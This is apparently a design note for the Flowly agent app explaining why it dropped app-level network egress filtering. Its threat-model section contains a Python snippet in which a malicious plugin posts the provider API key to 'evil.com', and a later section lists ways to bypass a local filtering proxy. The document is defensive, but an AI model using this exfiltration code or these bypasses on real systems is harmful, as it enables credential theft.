# Network Egress

Why Flowly does **not** implement application-level network egress
filtering, the explicit experiment that proved it infeasible at the
macOS sandbox-exec layer, and what we point operators at instead.

This is the security topic where Flowly's policy and code diverged
most sharply during the design conversation. The conclusion matches
what comparable upstream agent frameworks have landed on — but we
arrived at it by trying to ship the opposite and failing, so this
doc captures the experiment so the next person doesn't repeat it.

## TL;DR

- We do not filter outbound network at the application layer.
- macOS `sandbox-exec`'s SBPL does **not** support hostname-based
  outbound rules. Apple deliberately omits this.
- Linux `bubblewrap` has no per-host network filter either —
  namespace isolation is all-or-nothing.
- An in-application proxy would partly work but is bypassable in
  multiple ways and we judged the maintenance cost too high for the
  delivered protection.
- `SECURITY.md` §4.1 documents what operators should deploy
  instead: Little Snitch / Hands Off / iptables / nftables /
  Tailscale / VPN with egress filtering.

## What attack this would close

The strict-network mode would block:

```python
# Compromised plugin in-process:
from flowly.config.loader import load_config
cfg = load_config()
key = cfg.providers.anthropic.api_key
requests.post("https://evil.com/leak", json={"k": key})
```

Sandbox filesystem rules don't help — the config is already in
memory, no file read. Env scrub doesn't help — no subprocess,
plugin makes the HTTP call directly. Network egress filtering
would deny the `evil.com` TCP connect at the OS level: the plugin
gets `ConnectionRefusedError`, secret never leaves the machine.

This is the **last open vector** in the reviewer's threat model
("any plugin can read agent memory and exfiltrate"). The read half
is structural (in-process, can't be prevented). The exfil half is
what network egress would close.

## What we tried

Commits `e055b9e` → `8ac0caa` → `f22d05d` added:

- `config.security.strictNetwork: boolean` schema field.
- `config.security.allowedHosts: string[]` escape-hatch field.
- `flowly-desktop/src/main/local/sandbox/network-allowlist.ts`
  module that derives a host list from the operator's configured
  providers + channels + integrations + extras.
- Wiring in `flowlyai-service.ts:wrapWithSandbox` to pass the
  derived list into `SandboxPolicy.allowNetworkHosts` when
  `strictNetwork` was true.
- The existing macOS SBPL emitter was already structured to emit
  `(allow network-outbound (remote-host "...")) ...` rules when
  the allowlist was non-empty (the branch was code-complete but
  unreached until now).

The plan: opt-in toggle in Settings → Security; default off; when on,
auto-derive allowlist from config so operators don't have to type
endpoints by hand; let them add `github.com` / `registry.npmjs.org`
extras for dev workflows.

## Why it failed

End-to-end smoke test against the generated profile. The SBPL
parser rejected the syntax we'd emit:

```
$ /usr/bin/sandbox-exec -f /tmp/strict.sb /bin/echo "ok"
sandbox-exec: host must be * or localhost in network address

Backtrace:
/private/tmp/strict.sb:35:22:
	(local ip "127.0.0.1:*")
```

And the `(remote-host ...)` form we'd planned:

```
sandbox-exec: unbound variable: remote-host at /private/tmp/test-sbpl.sb, line 6
```

The SBPL grammar only accepts:

- `(remote ip "*")` — any
- `(remote ip "localhost:*")` — loopback any port
- `(remote ip "localhost:NNNN")` — loopback specific port

Hostname-based matching (`(remote-host "api.openai.com")`) is **not
a valid directive**. Apple deliberately omits hostname filtering at
the sandbox-exec layer — their position is that hostname filtering
belongs at the network layer (proxy, firewall, OS-level packet
filter), not the sandbox layer.

Confirmed by reading comparable upstream implementations: they don't
try this either. The pattern is to mention "network (L7 egress)" as
a layer that an external orchestration framework provides — i.e.
external to the application. The application code itself
code has no in-process network filtering. Their docker-compose.yml
uses `network_mode: host` and delegates network policy entirely to
the operator's setup.

### What about Linux bwrap?

bubblewrap has no per-host network filter. The only network
primitive is `--unshare-net` (whole network namespace isolation) vs
`--share-net` (host network). Per-host filtering would require:

- Run bwrap with `--unshare-net`.
- Set up a slirp4netns + a hostname-aware userspace proxy as the
  child's only path to the host network.
- The proxy parses SNI from TLS ClientHello, matches against the
  allowlist, allows or RST's.

That's a separate component to build, ship, and maintain. Plus the
SNI inspection is bypassable by ECH (Encrypted Client Hello, now
shipping in TLS 1.3 stacks) and DNS-over-HTTPS to resolve direct
IPs.

### What about an in-application HTTP proxy?

In theory: run a local proxy that the agent's Python HTTP client
goes through (`HTTPS_PROXY=http://localhost:18791`). The proxy
filters by Host header. SBPL allows only loopback outbound. Plugin
attempting `requests.post('https://evil.com', ...)` goes to the
proxy, gets denied.

Bypassable by:

- Direct IP connection (`socket.connect(('1.2.3.4', 443))`) — the
  proxy doesn't see it because the HTTP client routes by env-var.
- DNS-over-HTTPS to resolve `evil.com` → direct IP → as above.
- Plugin uses raw `socket` API instead of `requests`. Doesn't
  honour `HTTPS_PROXY`.
- Plugin uses an allowed upload host (github gist, npm publish,
  pastebin, S3 with operator's AWS creds passing through) as the
  exfil channel.
- WebSocket / gRPC traffic that doesn't fit the HTTP proxy model.

The proxy would be defence in depth, not a boundary. The maintenance
cost is real (every new HTTP client in the codebase has to honour
the proxy; CONNECT tunnel for HTTPS; mTLS support; deal with
proxy_url interactions in the wider Flowly stack). The protection
delivered is bypassable by determined attackers. Cost-benefit didn't
make sense to us.

## The revert

Three commits in, we admitted the architecture didn't deliver. The
strict-network feature was reverted:

| Reverted commit | Reverts |
|---|---|
| `2dd53d5` | `f22d05d` (Linux strict-network falls back to --share-net) |
| `344de10` | `8ac0caa` (host allowlist derivation) |
| `8d50b6e` | `e055b9e` (strictNetwork + allowedHosts config fields) |

Plus the corresponding uncommitted strict-network changes to
`flowly/sandbox/cli_wrap.py` (Python CLI) were reset before they
landed. The `network-allowlist.ts` module file is **gone** from main.

Settings UI never got the second toggle — we removed it before it
reached operator-visible code paths.

## What `SECURITY.md` §4.1 says now

```
Flowly does not implement application-level network egress
filtering. The reasoning matches what comparable upstream agent
frameworks have landed on: reliable hostname-based filtering at the
application boundary is harder than it looks and provides false
security if done poorly.
```

Then it lists what operators should deploy:

- **macOS**: Little Snitch or Hands Off for per-application outbound
  rules.
- **Linux**: `iptables` / `nftables` / `firewalld` scoped to the
  agent's user account; OpenSnitch for an interactive UI.
- **Cross-platform**: VPN or DNS service with egress filtering
  (NextDNS, Pi-hole, ControlD); corporate proxy.

The agent's filesystem isolation (§2.2) and subprocess credential
scrubbing (§2.3) still apply regardless of network configuration.

## What this means for the threat model

Recall the reviewer concern: *"any plugin can read your entire
agent's memory, including whatever credentials live in the runtime"*.

Coverage today:

| Vector | Status |
|---|---|
| Plugin reads agent memory | Not prevented — structural property of in-process loading |
| Plugin reads `~/.ssh` / `~/.aws` / Keychain / browser data | Prevented (filesystem sandbox) |
| Plugin reads `~/Documents` / workspace files | Allowed (legitimate agent work needs this) |
| Plugin writes to system paths / persistence locations | Prevented (filesystem sandbox) |
| Plugin reads provider creds via subprocess env | Prevented (env scrub) |
| Plugin reads provider creds in-process and exfiltrates via HTTP | **Not prevented in-app**; operator firewall is the answer |

The last row is the honest tradeoff. We tell operators in
`SECURITY.md` §4.1 what to do about it.

## When to revisit

The decision against in-app filtering was made for the
consumer-desktop user base today. Reasons to revisit:

- **Marketplace opens to third-party submission.** If anyone can
  publish a plugin to `useflowlyapp.com/marketplace`, the attack
  surface widens dramatically. At that point, every defence-in-depth
  layer matters even if individually bypassable. A proxy may be
  worth the maintenance cost.

- **Enterprise customer demands it.** Some compliance regimes
  require app-level egress controls (data residency, DLP). The
  proxy approach would address the checkbox even if technical
  experts could bypass.

- **A new platform primitive lands.** macOS may add hostname-based
  sandbox rules (unlikely but possible). Linux may grow per-host
  firewall rules accessible without root (very unlikely). If
  either happens, the cost-benefit math changes.

Until one of those, document the position, point at operator
firewall tools, and move on. The strict-network branch in git
history is a record of "we considered this; here's why it didn't
ship". Don't redo the work without new information.

## Related commits

| SHA | What |
|---|---|
| `e055b9e` | (Reverted) Schema fields |
| `8ac0caa` | (Reverted) Host derivation module |
| `f22d05d` | (Reverted) Linux fallback |
| `8d50b6e` | Revert of `e055b9e` |
| `344de10` | Revert of `8ac0caa` |
| `2dd53d5` | Revert of `f22d05d` |
| `3cc4b67` | `SECURITY.md` §4 Deployment Hardening — the honest position |
